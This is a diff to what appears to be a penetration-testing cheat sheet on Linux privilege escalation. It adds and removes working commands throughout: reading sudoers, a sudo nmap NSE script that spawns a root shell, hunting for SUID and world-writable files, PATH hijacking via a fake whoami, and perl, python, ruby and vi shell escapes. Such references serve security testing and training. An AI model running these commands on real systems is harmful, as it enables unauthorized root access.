@@ -153,12 +153,13 @@ gateway 192.168.2.1
 
 # Privilege Escalation
 
-- Execute a root command as another user
-/etc/sudoers                       Commands that a user is allowed to execute
+ls /home/                          Look for other users
+cat /etc/sudoers                   Allocate system rights to system users
 sudo -l                            Short version
-sudo <user>
-!/bin/sh
-id
+sudo -u <user> script.sh           Execute a script as another user
+id                                 User and group info on the current user
+echo "os.execute('/bin/sh')">test.nse
+sudo nmap --script=test.nse
 
 - Check for binaries with Sticky bit, SUID, and GUID.
 find / -perm -1000 -type d 2>/dev/null    # Sticky bit - only the owner of a directory or a file can delete or rename.
@@ -170,7 +171,7 @@ echo '/bin/sh' > whoami
 chmod 777 whoami
 export PATH=/tmp:$PATH
 /usr/bin/bin_with_suid
-id
+id                                 User and group info on the current user
 
 - Check for world-writable files and folders.
 find / -perm -o+w -type f 2>/dev/null     # world-writeable files
@@ -307,16 +308,14 @@ perl -e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
 
 - Python
-python -c 'import pty; pty.spawn("/bin/sh")'
-or
-python -c 'import pty; pty.spawn("/bin/bash")'
-python -c 'import os; os.system("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
 
 - Ruby
 ruby: exec "/bin/sh"
 
 - sh
 /bin/sh -i
+echo os.system('/bin/bash')
 
 - vi
 :!bash
